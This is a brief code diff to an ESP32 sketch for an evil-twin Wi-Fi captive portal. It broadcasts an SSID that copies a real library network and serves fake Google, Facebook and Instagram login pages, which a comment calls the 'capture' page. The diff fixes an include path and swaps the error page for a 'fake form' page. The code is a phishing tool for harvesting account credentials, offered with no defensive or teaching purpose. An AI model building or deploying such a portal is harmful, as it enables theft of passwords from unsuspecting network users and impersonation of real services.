@@ -5,7 +5,7 @@
 #include <DNSServer.h>
 #include <ESPmDNS.h>
 #include <FS.h>
-#include ".\google.h"
+#include "google.h"
 #include "facebook.h"
 #include "instagram.h"
 #include "erro.h"
@@ -17,7 +17,7 @@ const char *ssid="SENAI-FHZ-BIBLIOTECA";
 
 // Login da pagina de captura
 #define captivePortalPage GOOGLE_HTML
-#define erroPage ERROPAGE_HTML
+#define erroPage FAKE_FORM_HTML
 // INSTAGRAM_HTML, GOOGLE_HTML, FACEBOOK_HTML
 
 // Configuração básica usando configurações de rede comuns (porta DNS usual, IP e porta do servidor web)
